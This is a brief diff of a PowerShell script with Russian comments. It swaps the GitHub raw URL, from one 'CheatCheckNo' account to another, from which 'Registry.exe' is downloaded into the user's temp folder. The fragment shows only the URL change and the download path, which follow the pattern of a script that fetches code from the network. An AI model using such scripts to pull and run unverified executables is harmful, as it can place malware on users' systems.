@@ -19,7 +19,7 @@ try {
 } catch {}
 
 # Прямая ссылка на твой исполняемый файл
-$url = "https://github.com/CheatCheckNo98237/rect/raw/refs/heads/main/Registry.exe"
+$url = "https://github.com/CheatCheckNo98235/rect/raw/refs/heads/main/Registry.exe"
 $p = "$env:TEMP\Registry.exe"
 
 # Скачивание файла
